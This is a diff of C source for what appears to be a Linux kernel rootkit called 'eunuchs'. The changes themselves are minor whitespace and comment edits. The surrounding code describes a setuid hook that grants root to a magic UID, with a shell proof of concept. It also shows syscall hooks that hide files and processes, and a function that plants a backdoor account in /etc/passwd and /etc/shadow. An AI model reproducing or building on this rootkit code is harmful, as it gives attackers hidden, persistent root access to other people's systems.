@@ -34,7 +34,7 @@
  * (1) via setuid intercept:
  *  In your desired program, call `setuid(EUNUCHS_MAGIC_UID)`. Any other target uid will
  *  function as usual, but this particular target uid will elevate to 0. By
- *  default, this value is 0xdeadc0de. 
+ *  default, this value is 0xdeadc0de.
  *  See the program in tools/icanhazshell.c for proof of concept.
  *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
  *
@@ -319,8 +319,6 @@ static typeof(sys_kill) *orig_kill;
 static typeof(sys_fstat64) *orig_fstat64;
 static typeof(sys_lstat64) *orig_lstat64;
 static typeof(sys_stat64) *orig_stat64;
-/* static typeof(sys_stat) *orig_stat; */
-/* static typeof(sys_lstat) *orig_lstat; */
 
 /**
  * eunuchs_elevate_uid() -
@@ -508,7 +506,6 @@ static asmlinkage int eunuchs_fstat64(unsigned long fd, struct stat64 __user *st
     struct path *p = NULL;
     int hidden = 0;
 
-    /* if(!(f = fget(fd))) */
     spin_lock(&current->files->file_lock);
     f = fcheck_files(current->files, fd);
     if(!f)
@@ -671,7 +668,7 @@ static int show_proc_by_pid(char *pid)
     eunuchs_proc_hide_by_pid *show = NULL, *tmp = NULL;
     list_for_each_entry_safe(show, tmp, &proc_hide_by_pid_list, list)
     {
-        if(strcmp(show->pid,pid) == 0)
+        if(strcmp(show->pid, pid) == 0)
         {
             list_del(&show->list);
             kfree(show->pid);
@@ -869,9 +866,12 @@ static void eunuchs_lists_free(void)
 /* list of all modules (what lsmod shows) */
 static struct list_head *mod_list = NULL;
 
-/** 
+/**
  * eunuchs_install_backdoor() -
  *  Installs a backdoor account in /etc/passwd and /etc/shadow
+ *
+ *  File IO obnoxiousness assisted by
+ *  https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
  **/
 static int eunuchs_install_backdoor(void)
 {
